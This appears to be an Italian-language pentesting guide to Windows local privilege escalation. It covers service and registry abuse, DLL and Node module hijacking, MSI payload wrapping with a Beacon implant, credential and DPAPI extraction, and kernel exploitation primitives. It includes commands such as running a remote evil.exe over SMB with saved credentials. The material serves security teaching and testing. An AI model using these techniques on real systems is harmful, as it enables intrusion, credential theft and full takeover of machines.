...
In Windows ci sono diversi elementi che potrebbero **impedirti di enumerare il sistema**, eseguire eseguibili o persino **rilevare le tue attività**. Dovresti **leggere** la seguente **pagina** ed **enumerare** tutti questi **meccanismi** di **difesa** prima di iniziare l'enumerazione per la privilege escalation:
...
Le build recenti di Windows hanno inoltre introdotto un percorso di LPE **SMB arbitrary-port**, in cui un'autenticazione NTLM locale privilegiata viene riflessa tramite una connessione TCP SMB riutilizzata:
...
Questo [sito](https://msrc.microsoft.com/update-guide/vulnerability) è utile per cercare informazioni dettagliate sulle vulnerabilità di sicurezza Microsoft. Questo database contiene più di 4.700 vulnerabilità di sicurezza, mostrando la **massiccia superficie d'attacco** che presenta un ambiente Windows.
...
Puoi scoprire come attivare questa funzionalità all'indirizzo [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/).
```bash
...
I dettagli delle esecuzioni della pipeline PowerShell vengono registrati, inclusi i comandi eseguiti, le invocazioni dei comandi e parti degli script. Tuttavia, i dettagli completi dell'esecuzione e i risultati dell'output potrebbero non essere acquisiti.
...
```
Gli eventi di logging per lo Script Block possono essere individuati in Windows Event Viewer nel percorso: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
...
Per sfruttare queste vulnerabilities puoi usare strumenti come: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- Questi sono exploit script MiTM weaponized per iniettare aggiornamenti 'fake' nel traffico WSUS non-SSL.
...
In pratica, questo è il flaw sfruttato da questo bug:

> Se abbiamo il potere di modificare il proxy del nostro utente locale e Windows Updates utilizza il proxy configurato nelle impostazioni di Internet Explorer, abbiamo quindi la possibilità di eseguire [PyWSUS](https://github.com/GoSecure/pywsus) localmente per intercettare il nostro stesso traffico ed eseguire codice come utente elevato sul nostro asset.
>
...
Puoi sfruttare questa vulnerability usando lo strumento [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (una volta liberato).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Molti enterprise agent espongono una superficie IPC su localhost e un canale di aggiornamento privilegiato. Se l'enrollment può essere forzato verso un server dell'attacker e l'updater si fida di una rogue root CA o di controlli deboli sul signer, un utente locale può fornire un MSI malicious che il servizio SYSTEM installa. Consulta una tecnica generalizzata (basata sulla chain Netskope stAgentSvc – CVE-2025-0309) qui:
...
Veeam B&R < `11.0.1.1261` espone un servizio su localhost sulla **TCP/9401** che processa messaggi controllati dall'attacker, consentendo comandi arbitrari come **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup>
...
- **Exploit**: posiziona una PoC come `VeeamHax.exe` con le DLL Veeam richieste nella stessa directory, quindi triggera un payload SYSTEM tramite il socket locale:
```powershell
...
Esiste una vulnerabilità di **escalation dei privilegi locali** negli ambienti Windows **domain** in condizioni specifiche. Queste condizioni includono ambienti in cui la **firma LDAP non è applicata,** gli utenti dispongono di diritti autonomi che consentono loro di configurare la **Resource-Based Constrained Delegation (RBCD),** oltre alla possibilità per gli utenti di creare computer all'interno del dominio. È importante notare che questi **requisiti** sono soddisfatti usando le **impostazioni predefinite**.
...
```
Se disponi di una sessione meterpreter, puoi automatizzare questa tecnica usando il modulo **`exploit/windows/local/always_install_elevated`**

### PowerUP

Usa il comando `Write-UserAddMSI` di power-up per creare nella directory corrente un binary MSI di Windows per effettuare la privilege escalation. Questo script scrive un installer MSI precompilato che richiede l'aggiunta di un utente/gruppo (quindi sarà necessario avere accesso GIU):
```
Write-UserAddMSI
```
Esegui semplicemente il binary creato per eseguire la privilege escalation.

### MSI Wrapper

Leggi questo tutorial per imparare a creare un MSI wrapper utilizzando questi tools. Nota che puoi eseguire il wrapping di un file "**.bat**" se vuoi **semplicemente eseguire** **command lines**
...
- Continua a fare clic su **Next** fino ad arrivare al passaggio 3 di 4 (selezione dei file da includere). Fai clic su **Add** e seleziona il Beacon payload appena generato. Quindi fai clic su **Finish**.
- Seleziona il progetto **AlwaysPrivesc** nel **Solution Explorer** e, nelle **Properties**, modifica **TargetPlatform** da **x86** a **x64**.
- Puoi modificare anche altre proprietà, come **Author** e **Manufacturer**, per rendere l'app installata più legittima.
...
- Fai doppio clic su **Application Folder**, seleziona il file **beacon.exe** e fai clic su **OK**. In questo modo il Beacon payload verrà eseguito non appena verrà eseguito l'installer.
- Nelle **Custom Action Properties**, modifica **Run64Bit** in **True**.
- Infine, **esegui la build**.
...
Dovresti verificare se alcuni dei gruppi a cui appartieni dispongono di permessi interessanti
```bash
# CMD
...
Prima di tutto, elencando i processi, **verifica la presenza di password nella riga di comando del processo**.\
Verifica se puoi **sovrascrivere qualche binary in esecuzione** o se disponi di permessi di scrittura sulla cartella del binary per sfruttare possibili [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
...
```
Controlla sempre la presenza di possibili [**debugger electron/cef/chromium** in esecuzione: potresti abusarne per effettuare una privilege escalation](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).
...
```
**Controllo delle autorizzazioni delle cartelle dei binari dei processi (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
...
```
### **Modificare il percorso del binary del servizio**

Nello scenario in cui il gruppo "Authenticated users" dispone di **SERVICE_ALL_ACCESS** su un servizio, è possibile modificare il binary eseguibile del servizio. Per modificare ed eseguire **sc**:
```bash
...
```
I privilegi possono essere incrementati tramite varie autorizzazioni:

- **SERVICE_CHANGE_CONFIG**: Consente la riconfigurazione del binario del servizio.
- **WRITE_DAC**: Consente la riconfigurazione delle autorizzazioni, permettendo di modificare le configurazioni del servizio.
...
Se un servizio viene eseguito come **`LocalSystem`**, **`LocalService`**, **`NetworkService`** o come account di dominio privilegiato, ma gli utenti con pochi privilegi possono modificare l'EXE del servizio o la relativa cartella padre, spesso è possibile effettuare il hijacking del servizio **sostituendo il binario e riavviando il servizio**.
...
```
Cerca ACL pericolose assegnate a **`Everyone`**, **`BUILTIN\Users`** o **`Authenticated Users`**, soprattutto **`(F)`**, **`(M)`** o **`(W)`** sull'eseguibile del servizio o sulla directory che lo contiene. Un flusso pratico di abuso è:<sup>[[27]](#references)</sup>
...
```
> Se il servizio non consente a un utente normale di riavviarlo, verifica se si avvia automaticamente all'avvio, dispone di un'azione in caso di errore che lo riavvia oppure può essere attivato indirettamente dall'applicazione che lo utilizza.
...
Puoi **verificare** le tue **autorizzazioni** su un **registro** dei servizi eseguendo:
```bash
...
```
È necessario verificare se **Authenticated Users** o **NT AUTHORITY\INTERACTIVE** dispongono di permessi `FullControl`. In tal caso, il binary eseguito dal service può essere modificato.
...
Alcune funzionalità di accessibilità di Windows creano chiavi **ATConfig** per utente, che in seguito vengono copiate da un processo **SYSTEM** in una chiave di sessione HKLM. Una **symbolic link race** del registro può reindirizzare questa scrittura privilegiata verso **qualsiasi percorso HKLM**, fornendo una primitiva di **scrittura arbitraria di valori** HKLM.<sup>[[18]](#references)</sup>
...
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` viene creata durante l'accesso o le transizioni al desktop sicuro ed è scrivibile dall'utente.

Flusso di abuso (CVE-2026-24291 / ATConfig):

1. Popola il valore **HKCU ATConfig** che vuoi venga scritto da SYSTEM.
2. Attiva la copia verso il desktop sicuro (ad esempio, **LockWorkstation**), avviando il flusso dell'AT broker.
...
Scegli un servizio che un utente normale possa avviare (ad esempio **`msiserver`**) e attivalo dopo la scrittura. **Nota:** l'implementazione pubblica dell'exploit **blocca la workstation** come parte della race.
...
Se il percorso di un eseguibile non è racchiuso tra virgolette, Windows proverà a eseguire ogni possibile parte terminante prima di uno spazio.
...
Windows consente agli utenti di specificare le azioni da eseguire se un servizio si arresta in modo anomalo. Questa funzionalità può essere configurata in modo da puntare a un binario. Se questo binario può essere sostituito, potrebbe essere possibile effettuare una privilege escalation. Ulteriori dettagli sono disponibili nella [documentazione ufficiale](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Applicazioni

### Applicazioni installate

Controlla le **autorizzazioni dei binari** (forse puoi sovrascriverne uno ed effettuare una privilege escalation) e delle **cartelle** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
...
**Verifica se puoi sovrascrivere elementi del registro o file binari che verranno eseguiti da un altro utente.**\
**Leggi** la **pagina seguente** per saperne di più sulle **posizioni autorun interessanti per l'escalation dei privilegi**:
...
driverquery /SI
```
Se un driver espone una primitive arbitraria di lettura/scrittura del kernel (comune nei gestori IOCTL progettati male), è possibile effettuare un'escalation rubando direttamente un token SYSTEM dalla memoria del kernel.<sup>[[13]](#references)</sup> Vedere la tecnica dettagliata qui:
...
#### UAF di code cancel-safe, disclosure dal paged-pool e pivot tramite I/O ring

Alcune catene Windows kernel LPE possono essere costruite a partire da due bug singolarmente deboli: una **race di durata in una cancel-safe queue** che libera una richiesta/CBD mentre il queue lock è ancora acquisito, e una **disclosure con rilascio del lock prima della copia** che divulga un'allocazione liberata dal paged-pool durante `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Note di audit ed exploitation:

- **Free-under-lock + cancel afterwards**: cercare un percorso di successo che esegue **Acquire -> CompleteRequest/free -> Release**, mentre il percorso di cancellazione esegue **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Se il percorso di successo raggiunge `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` prima di rilasciare il lock CBDQ/CSQ, un thread bloccato in `NtCancelIoFileEx -> IopCsqCancelRoutine` può riprendere in seguito e passare un `PFLT_CALLBACK_DATA` liberato alla callback di rimozione del driver.
- **Recuperare l'oggetto della queue liberato** con un'allocazione paged-pool delle stesse dimensioni e controllata dall'attaccante. Le `NPFS` Data Queue Entries sono utili perché payload e dimensione sono controllabili e in seguito è possibile esaminarle con operazioni di pipe read/peek. Se l'oggetto liberato incorpora list links, sovrascriverli con una **lista ciclica di fake request nodes nella user memory** in modo che il driver elabori ripetutamente strutture di richiesta definite dall'attaccante invece di terminare presso l'originale list head.
- **Potenziare una predictable write**: se la fake request reindirizza un nested context pointer usato dalle scritture di bookkeeping (timestamp / QPC / campi adiacenti al refcount), è possibile ottenere una scrittura kernel **controllata nell'indirizzo ma non nel valore**. In tal caso, prendere di mira il campo **length/size** di un oggetto del pool sottoposto a spray invece di un puntatore finale a codice/dati, quindi enumerare lo spray finché l'oggetto corrotto non produce una **lettura paged-pool out-of-bounds**.
- **Pattern di disclosure sfruttabile tramite race**: qualsiasi syscall che esegue `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` è un candidato eccellente. L'affidabilità migliora quando l'attaccante può aumentare il buffer copiato (ad esempio aggiungendo molte list/resource entries che incrementano la dimensione dell'allocazione finale del serializer), perché una copia più lunga amplia la finestra di sostituzione senza necessariamente causare il crash della macchina.
- **Target di refill ricchi di puntatori**: gli array di registered-buffer di Windows **I/O ring** sono eccellenti target di disclosure perché la loro dimensione nel paged-pool è controllata dall'attaccante (`8 * regBufferCnt`) e ogni elemento è un puntatore kernel a un `_IOP_MC_BUFFER_ENTRY`. Divulgare uno di questi array, recuperare il `IORING_OBJECT` circostante, quindi corrompere **`RegBuffers`** e **`RegBuffersCount`** affinché le operazioni successive dell'I/O ring utilizzino entry contraffatte dall'attaccante e forniscano lettura/scrittura arbitraria del kernel. Se l'unica scrittura disponibile consente di ottenere un byte stabile (ad esempio da `KUSER_SHARED_DATA+0x14`), usare **scritture non allineate sovrapposte** per costruire un user pointer a byte ripetuti come `0x0101010101010101`, mapparlo con `VirtualAlloc` e collocare lì il forged registered-buffer array.<sup>[[30]](#references)</sup>
...
```
Una volta ottenuti primitive arbitrarie di lettura/scrittura del kernel dall’I/O ring corrotto, sottrai un token SYSTEM usando il workflow standard post-primitive:
...
Le vulnerabilità moderne degli hive consentono di predisporre layout deterministici, abusare dei discendenti scrivibili di HKLM/HKU e trasformare la corruzione dei metadati in overflow del kernel paged-pool senza un custom driver. Impara la catena completa qui:
...
Alcuni driver accettano un registry path dallo userland, verificano soltanto che sia una stringa UTF-16 valida e quindi chiamano `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` con `RTL_QUERY_REGISTRY_DIRECT` in uno scalar sullo stack, come `int readValue`. Se manca `RTL_QUERY_REGISTRY_TYPECHECK`, `EntryContext` viene interpretato in base al tipo **effettivo** del registro, non al tipo previsto dallo sviluppatore.

Questo crea due primitive utili:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: un path assoluto `\Registry\...` controllato dall’utente consente al driver di interrogare key scelte dall’attacker, rivelare l’esistenza tramite return code/log e talvolta leggere valori ai quali il caller non potrebbe accedere direttamente.
...
- **Windows 8+ mitigation**: se la query raggiunge un **untrusted hive** con `RTL_QUERY_REGISTRY_DIRECT` ma senza `RTL_QUERY_REGISTRY_TYPECHECK`, i kernel caller vanno in crash con `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Per mantenere l’exploitability, cerca key scrivibili dall’attacker all’interno di **trusted system hive** invece di preparare i value sotto `HKCU`.
- **Trusted-hive staging**: usa NtObjectManager per enumerare i discendenti scrivibili di `\Registry\Machine` ed esegui nuovamente la scansione con un token **low-integrity** duplicato per trovare key raggiungibili da contesti sandboxed:<sup>[[26]](#references)</sup>
```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```
- **`REG_QWORD`**: una scrittura diretta di 8 byte in un `int` di 4 byte corrompe i dati adiacenti dello stack e può sovrascrivere parzialmente un callback/function pointer nelle vicinanze.
...
- **`REG_BINARY`**: per i dati binari di grandi dimensioni, la modalità diretta tratta il primo `LONG` in `EntryContext` come una dimensione del buffer con segno. Se una lettura precedente di `REG_DWORD` lascia un valore negativo controllato dall'attacker nello scalare riutilizzato, la query successiva di `REG_BINARY` copia i byte dell'attacker direttamente sopra gli slot adiacenti dello stack, rappresentando spesso il percorso più pulito per la sovrascrittura completa di un callback-pointer.
...
- Lettura/scrittura raw non restritta del disco (tampering offline, tecniche di persistenza al boot).
...
- Limita gli IOCTL (access mask, METHOD_*, validazione degli input) e valuta l’utilizzo di modelli brokered invece di privilegi kernel diretti.

Idee per il rilevamento da parte dei difensori
- Monitora le aperture in user-mode di nomi di device sospetti (ad es., \\ .\\amsdk*) e specifiche sequenze IOCTL indicative di abuso.
- Applica la vulnerable driver blocklist di Microsoft (HVCI/WDAC/Smart App Control) e mantieni le tue liste allow/deny.


## PATH DLL Hijacking

Se disponi di **permessi di scrittura all’interno di una cartella presente nel PATH**, potresti essere in grado di effettuare il hijacking di una DLL caricata da un processo e **ottenere un’escalation dei privilegi**.<sup>[[2]](#references)</sup>
...
Questa è una variante di **Windows uncontrolled search path** che interessa le applicazioni **Node.js** ed **Electron** quando eseguono un'importazione bare come `require("foo")` e il modulo previsto è **missing**.<sup>[[20]](#references)</sup>
...
Se un **low-privileged user** può creare `C:\node_modules`, può inserire un `foo.js` malevolo (o una cartella del package) e attendere che un processo **Node/Electron con privilegi più elevati** risolva la dependency mancante. Il payload viene eseguito nel contesto di sicurezza del processo vittima, quindi questo diventa **LPE** quando il target viene eseguito come administrator, da uno scheduled task/wrapper di servizio elevated o da un'applicazione desktop privilegiata avviata automaticamente.
...
- il `require()` vulnerabile si trova in profondità nell'albero delle dependency anziché nel codice principale dell'applicazione
...
- Concentrati su `NAME NOT FOUND` e sull'apertura riuscita finale sotto `C:\node_modules`

Pattern utili per il code review nei file `.asar` decompressi o nei sorgenti dell'applicazione:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
...
1. Identifica il **nome del package mancante** da Procmon o dalla revisione del codice sorgente.
2. Crea la directory di lookup root se non esiste già:
```powershell
mkdir C:\node_modules
```
3. Deposita un modulo con il nome esatto previsto:
```javascript
// C:\node_modules\foo.js
...
Esempi reali di moduli opzionali mancanti che seguono questo pattern includono `bluebird` e `utf-8-validate`, ma la **technique** è la parte riutilizzabile: trova qualsiasi **missing bare import** che un processo privilegiato Windows Node/Electron risolverà.
...
- Includi tutte le runtime dependencies in produzione e verifica l'uso di `optionalDependencies`.
- Esamina il codice di terze parti alla ricerca di pattern silenziosi `try { require("...") } catch {}`.
- Disabilita le probe opzionali quando la libreria lo supporta (ad esempio, alcune distribuzioni `ws` possono evitare la legacy `utf-8-validate` probe con `WS_NO_UTF_8_VALIDATE=1`).
...
Controlla la presenza di altri computer conosciuti codificati staticamente nel file hosts
```
...
Se si ottiene l'utente root, è possibile ascoltare su qualsiasi porta (la prima volta che si usa `nc.exe` per ascoltare su una porta, verrà richiesto tramite GUI se `nc` debba essere autorizzato dal firewall).
```bash
wsl whoami
...
Windows Vault memorizza le credenziali utente per server, siti web e altri programmi a cui **Windows** può effettuare automaticamente il **login per gli utenti**. A prima vista, potrebbe sembrare che ora gli utenti possano memorizzare le proprie credenziali di Facebook, Twitter, Gmail, ecc., in modo da effettuare automaticamente il login tramite i browser. Ma non è così.

Windows Vault memorizza le credenziali con cui Windows può effettuare automaticamente il login per gli utenti; ciò significa che qualsiasi **applicazione Windows che necessita di credenziali per accedere a una risorsa** (server o sito web) **può utilizzare Credential Manager** & Windows Vault e usare le credenziali fornite invece di richiedere ogni volta agli utenti di inserire nome utente e password.
...
```
Quindi puoi usare `runas` con l'opzione `/savecred` per utilizzare le credenziali salvate. L'esempio seguente richiama un binario remoto tramite una condivisione SMB.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Utilizzo di `runas` con credenziali fornite.
```bash
...
Puoi **estrarre molte **masterkeys** DPAPI** dalla **memoria** con il modulo `sekurlsa::dpapi` (se disponi dei privilegi root).
...
Le **credenziali PowerShell** vengono spesso utilizzate per le attività di **scripting** e automazione, come metodo per archiviare comodamente credenziali crittografate. Le credenziali sono protette tramite **DPAPI**, il che in genere significa che possono essere decrittografate solo dallo stesso utente sullo stesso computer su cui sono state create.

Per **decrittografare** delle credenziali PS dal file che le contiene, puoi eseguire:
```bash
...
**Tieni presente che per recuperare le password da AppCmd.exe devi essere Administrator ed eseguire il processo con un livello High Integrity.**\
...
Le chiavi private SSH possono essere memorizzate nella chiave di registro `HKCU\Software\OpenSSH\Agent\Keys`, quindi dovresti controllare se contiene qualcosa di interessante:
```bash
...
File noti che in passato contenevano **password** in **testo in chiaro** o in **Base64**
```bash
...
Controlla anche la cronologia, i segnalibri e i preferiti dei browser, perché è possibile che alcune **password siano** archiviate lì.
...
In pratica, se puoi **sovrascrivere una qualsiasi delle DLL** che verranno eseguite, potresti **escalare i privilegi** se quella DLL viene eseguita da un altro utente.

Per scoprire come gli attacker usano COM Hijacking come meccanismo di persistenza, consulta:
...
### **Ricerca generica delle password nei file e nel registry**
...
[Leggi **quest'altro post per una spiegazione più completa su come testare e abusare di altri handle aperti di processi e thread ereditati con diversi livelli di permessi (non solo accesso completo)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

I segmenti di memoria condivisa, chiamati **pipe**, consentono la comunicazione tra processi e il trasferimento di dati.

Windows fornisce una funzionalità chiamata **Named Pipes**, che consente a processi non correlati di condividere dati, anche su reti diverse. Questo sistema assomiglia a un'architettura client/server, con ruoli definiti come **named pipe server** e **named pipe client**.

Quando un **client** invia dati tramite una pipe, il **server** che ha configurato la pipe può **assumere l'identità** del **client**, a condizione che disponga dei diritti **SeImpersonate** necessari. Identificare un **processo privilegiato** che comunica tramite una pipe che puoi simulare offre l'opportunità di **ottenere privilegi più elevati**, adottando l'identità di tale processo quando interagisce con la pipe da te stabilita. Per istruzioni su come eseguire questo attacco, puoi consultare guide utili [**qui**](named-pipe-client-impersonation.md) e [**qui**](#from-high-integrity-to-system).
...
Il servizio Telephony (TapiSrv) in modalità server espone `\\pipe\\tapsrv` (MS-TRP). Un client remoto autenticato può abusare del percorso degli eventi asincroni basato su mailslot per trasformare `ClientAttach` in una **scrittura arbitraria di 4 byte** su qualsiasi file esistente scrivibile da `NETWORK SERVICE`, ottenendo quindi i diritti di amministratore Telephony e caricando una DLL arbitraria come servizio. Flusso completo:
...
- Ogni evento scrive `InitContext`, controllato dall'attaccante e proveniente da `Initialize`, su quell'handle. Registra un'app line con `LRegisterRequestRecipient` (`Req_Func 61`), attiva `TRequestMakeCall` (`Req_Func 121`), recupera l'evento tramite `GetAsyncEvents` (`Req_Func 0`), quindi annulla la registrazione/termina per ripetere scritture deterministiche.
...
Quando ottieni una shell come utente, potrebbero essere in esecuzione attività pianificate o altri processi che **passano credenziali nella riga di comando**. Lo script seguente acquisisce le righe di comando dei processi ogni due secondi e confronta lo stato corrente con quello precedente, mostrando eventuali differenze.
```bash
while($true)
{
...
L'attacco consiste fondamentalmente nell'abusare della funzione di rollback di Windows Installer per sostituire file legittimi con file malevoli durante il processo di disinstallazione. A questo scopo, l'attacker deve creare un **malicious MSI installer** che verrà utilizzato per hijackare la cartella `C:\Config.Msi`, che in seguito verrà usata da Windows Installer per memorizzare i file di rollback durante la disinstallazione di altri pacchetti MSI, i cui file di rollback saranno stati modificati per contenere il malicious payload.
...
- Effettuare il **poll dell'open file handle** usando `GetFinalPathNameByHandle` per rilevare quando il file diventa `C:\Config.Msi\<random>.rbf`.
...
- Step 8: Monitorare la presenza del `.rbs`
...
- Una **type 19 custom action (`ErrorOut`)** è configurata per **causare intenzionalmente il fallimento dell'installazione** in un punto noto.
...
- Ora possiedi la tua **malicious DLL in un path caricato da SYSTEM**.
...
La tecnica principale di MSI rollback (quella precedente) presuppone che tu possa eliminare una **cartella intera** (ad esempio, `C:\Config.Msi`). Ma cosa succede se la tua vulnerability consente solo l'**arbitrary file deletion**?
...
### Dall'eliminazione del contenuto di una cartella all'EoP tramite SYSTEM
...
- Questo processo esegue la scansione delle cartelle (ad esempio, `%TEMP%`) e tenta di eliminarne il contenuto.
- Quando raggiunge `file1.txt`, si attiva l'**oplock** e trasferisce il controllo alla tua callback.
...
- Se lo **si crea in anticipo come cartella**, Windows non riesce a caricare il driver effettivo durante l'avvio.
- Quindi Windows prova a caricare `cng.sys` durante l'avvio.
- Trova la cartella, **non riesce a risolvere il driver effettivo** e **va in crash o interrompe l'avvio**.
- Non c'è **alcun fallback** né **possibilità di ripristino** senza interventi esterni (ad es. riparazione dell'avvio o accesso al disco).

### Dai percorsi privilegiati di log/backup + symlink OM alla sovrascrittura arbitraria di file / DoS all'avvio

Quando un **servizio privilegiato** scrive log/export in un percorso letto da una **configurazione scrivibile**, reindirizza quel percorso con **symlink Object Manager + mount point NTFS** per trasformare la scrittura privilegiata in una sovrascrittura arbitraria (anche **senza SeCreateSymbolicLinkPrivilege**).<sup>[[15]](#references)</sup>

**Requisiti**
- La configurazione che memorizza il percorso di destinazione deve essere scrivibile dall'attacker (ad es. `%ProgramData%\...\.ini`).
...
```
3. Attendi che il componente privilegiato scriva il log (ad esempio, l'amministratore attiva "invia SMS di prova"). La scrittura viene ora effettuata in `C:\Windows\System32\cng.sys`.
...
Se stai già eseguendo un processo High Integrity, la **path to SYSTEM** può essere semplice: è sufficiente **creare ed eseguire un nuovo servizio**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Quando crei un binario di un servizio, assicurati che sia un servizio valido o che il binario esegua rapidamente le azioni necessarie, poiché verrà terminato dopo 20s se non è un servizio valido.
...
Usando questa tecnica, di solito viene **selezionato un qualsiasi processo in esecuzione come SYSTEM con tutti i token privileges** (_sì, puoi trovare processi SYSTEM senza tutti i token privileges_).\
**Puoi trovare un** [**esempio di codice che esegue la tecnica proposta qui**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Questa tecnica viene utilizzata da meterpreter per effettuare l'escalation tramite `getsystem`. La tecnica consiste nel **creare una pipe e poi creare/abusare di un servizio per scrivere su quella pipe**. In seguito, il **server** che ha creato la pipe usando il privilegio **`SeImpersonate`** potrà **impersonare il token** del client della pipe (il servizio), ottenendo privilegi SYSTEM.\
...
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Verifica le configurazioni errate e i file sensibili (**[**controlla qui**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Rilevato.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Verifica alcune possibili configurazioni errate e raccoglie informazioni (**[**controlla qui**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
...
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Esegue lo spray delle password raccolte nell'intero dominio**\
...
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Enumerazione di base per la privesc su Windows**\
...
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumera l'host cercando configurazioni errate (è più uno strumento di raccolta di informazioni che di privesc) (deve essere compilato) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
...
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Verifica le configurazioni errate (eseguibile precompiled su github). Non consigliato. Non funziona bene in Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Verifica le possibili configurazioni errate (exe derivato da Python). Non consigliato. Non funziona bene in Win10.
...
- [1] [Fondamenti della Privilege Escalation su Windows](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Elevazione dei privilegi sfruttando permessi deboli sulle cartelle](http://www.greyhathacker.net/?p=738)
- [3] [Privilege Escalation su Windows - una cheatsheet](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
...
- [8] [Guida alla Privilege Escalation su Windows](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Checklist per la Privilege Escalation su Windows](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Metodi di Privilege Escalation su Windows per Pentesters](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
...
- [14] [Check Point Research – Alla ricerca della Silver Fox: gatto e topo nelle ombre del kernel](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
...
- [19] [RegPwn BOF (porting BOF per Cobalt Strike)](https://github.com/Flangvik/RegPwnBOF)
...
- [29] [Pwn2Own with Microslop: concatenamento di race condition del kernel CLDFLT e DirectX per la LPE di Windows](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Un I/O Ring per dominarli tutti: una primitiva completa di exploit in lettura/scrittura su Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Abuso delle eliminazioni arbitrarie di file per ottenere la Privilege Escalation e altri fantastici trucchi](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
...
- [36] [research.nccgroup.com - Kerberos Resource Based Constrained Delegation: quando una modifica dell'immagine porta a una Privilege Escalation](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
